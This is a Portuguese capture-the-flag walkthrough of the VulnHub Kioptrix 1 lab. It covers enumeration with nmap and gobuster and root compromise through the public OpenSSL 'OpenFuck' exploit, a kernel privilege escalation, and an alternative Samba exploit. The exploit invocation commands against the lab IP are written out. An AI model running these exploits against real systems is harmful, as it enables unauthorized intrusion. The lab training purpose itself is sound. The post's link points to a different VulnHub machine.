---
title: "VulnHub - Kioptrix 1"
tags: [Linux,Easy,Web,Gobuster,Samba,Kernel]
categories: VulnHub OSCP
---

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1/inicial.png)

Link: [Kioptrix 1](https://www.vulnhub.com/entry/photographer-1,519/)

# Enumeração

## Primeiro passo é rodar o arp-scan para detectarmos os hosts

```bash
arp-scan -I eth1 192.168.56.0/24
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1/arp.png)

## Segundo passo é rodar o nmap contra a máquina, para verificar quais portas estão abertas e quais serviços estão sendo disponibilizados pelas portas.

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1/nmap.png)

Full ports scan

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1/nmap1.png)

### Explicação de cada parâmetro do Nmap

> -sC --> Rodar alguns scripts padrão em cada porta

> -sV --> Levantar qual serviço está rodando na porta

> -Pn --> Já considera o host ativo

> -T5 --> Modo insano

### Verificamos que temos 6 portas abertas no servidor

> Porta 22 -> SSH

> Portas 80 e 443 -> Web

> Portas 111 e 139 -> Samba

> Porta 32768 -> ?!

## Enumeração da Porta 80

Acessamos a página web para verificar do que se trata

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1/web.png)

Gobuster nela

```bash
gobuster dir -u http://192.168.56.143 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php -t 30
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1/gobuster.png)

Encontramos vários diretórios acessíveis, vamos ver o que temos neles

### /test.php

Parece ser algum arquivo php sendo executado

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1/web1.png)

### /mrtg

Assim que acessamos o diretório /mrtg vemos que ele redireciona para o endereço http://127.0.0.1/mrtg, e logicamente da erro

Vamos prosseguir por enquanto

## Enumeração da Porta 443

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1/https.png)

Apareceu ser uma página padrão do apache.

Verificando no nmap temos a versão do serviço ssl que está sendo executada é uma específica

`mod_ssl/2.8.4 OpenSSL/0.9.6b`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1/https1.png)

Procuramos por exploits e encontramos uma chamado OpenFuck

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1/ssl.png)

Passamos ele para nossa máquina

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1/ssl1.png)

Verificamos que precisamos algumas dependencias para poder compilar ele

`apt-get install libssl1.0-dev`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1/ssl2.png)

Agora compilamos ele na nossa máquina

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1/ssl3.png)

# apache - root

Executamos de acordo com as informações que temos da máquina e ganhamos um shell nela de apache

```bash
./OpenFuck 0x6b 192.168.56.143 443 -c 45
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1/exp1.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1/exp.png)

Vemos que assim que ele entra na máquina, tenta baixar um exploit para escalação de privilégio, mas não consegue por que não temos acesso a internet nessa máquina, então baixamos esse exploit e fazemos manualmente

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1/exp2.png)

Compilamos ele na nossa máquina

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1/exp3.png)

Agora executamos e viramos root

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1/exp4.png)

Outro modo de se escalar privilégio é pelo samba

# Bônus

Algo a mais é outro modo de se explorar essa máquina através do Samba que tem disponível nela, verificamos a versão que está sendo executado na porta 139

```bash
nmap --script smb-vuln* 192.168.56.143
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1/samba.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1/samba1.png)

Pesquisamos por exploits para a versão do samba

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1/s.png)

Copiamos para a máquina

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1/s1.png)

Compilamos ele

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1/s2.png)

Executamos e viramos root

```bash
./exploit -b 0 -c 192.168.56.102 192.168.56.143
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1/s3.png)




